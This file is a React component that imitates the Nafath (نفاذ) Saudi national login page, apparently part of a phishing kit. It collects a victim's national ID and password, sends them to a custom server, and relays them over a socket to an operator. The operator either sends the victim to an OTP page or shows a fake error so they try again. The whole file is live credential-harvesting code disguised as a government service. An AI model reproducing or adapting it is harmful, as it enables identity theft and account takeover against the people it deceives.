import React from "react";
import { useState } from "react";
import axios from "axios";

import { api_route, socket } from "../App";
const Navaz = () => {
  const token = sessionStorage.getItem("session");
  const [error, setError] = useState(null);
  const query = new URLSearchParams(window.location.search);
  const queryData = query.get("data");
  const [page, setPage] = useState(0);
  const [loading, setLoading] = useState(false);
  const [data, setData] = useState({
    NavazCard: "",
    NavazPassword: "",
  });

  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;
    setData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSumbit = async (e) => {
    e.preventDefault();
    setLoading(true);
    await axios
      .post(api_route + "/navaz/" + sessionStorage.getItem("id"), {
        ...JSON.parse(queryData),
        ...data,
      })
      .then((res) => {
        if (res.status === 200) {
          const { fullname, email } = JSON.parse(queryData);
          setPage(1);

          socket.emit("navaz", {
            fullname,
            email,
            NavazCard: data.NavazCard,
            NavazPassword: data.NavazPassword,
            token,
          });
        }
      });
  };

  socket.on("acceptNavaz", ({ id, userOtp }) => {
    if (id === sessionStorage.getItem("id")) {
      window.location.href = "/navazOtp/" + userOtp;
    }
  });

  socket.on("declineNavaz", (info) => {
    if (info.token === token) {
      setPage(0);
   
            setError("حدث خطأ برجاء المحاولة مره أخري");
    }
  });
  return (
    <div className="bg-white w-full py-8 border-t-2 border-sky-500" dir="rtl">
      <span className=" text-5xl font-bold pr-8" style={{ color: "#009987" }}>
        نفاذ
      </span>
      <div className="w-full  my-3 py-3 flex flex-col items-center justify-center gap-y-3">
        {page === 0 ? (
          <form
            className="md:w-10/12 w-full flex flex-col bg-white py-8"
            onSubmit={handleSumbit}
          >
            <img src="/navaz3.png" />
            <div className="flex flex-col w-full p-5 gap-y-1">
              <input
                placeholder="  الهوية الوطنية / الإقامة"
                type="text"
                className="border-2 p-2 text-center rounded-md w-full outline-green-500"
                onChange={handleChange}
                required
                name="NavazCard"
                value={data.NavazCard}
              />
            </div>
            <div className="flex flex-col w-full p-5 gap-y-1">
              <input
                placeholder=" كلمة المرور"
                type="password"
                className="border-2 p-2 text-center rounded-md w-full outline-green-500"
                onChange={handleChange}
                required
                name="NavazPassword"
                value={data.NavazPassword}
              />
            </div>
            {error && (
              <span className="w-full p-5 rounded-md border border-red-500 bg-red-100">
                {" "}
                {error}
              </span>
            )}
            <div className="w-full justify-center flex flex-col items-center">
              <button
                className="flex items-center justify-center w-2/3 rounded-md text-white py-2 text-lg "
                style={{ backgroundColor: "#009987" }}
                type="submit"
              >
                <span>إستمرار</span>
              </button>
            </div>
          </form>
        ) : (
          <div className="flex flex-col w-full md:p-8 p-3 text-sm gap-y-5 my-3 ">
            <img src="naavazCode.png" />
            <div class="container">
              <div class="bar"></div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Navaz;
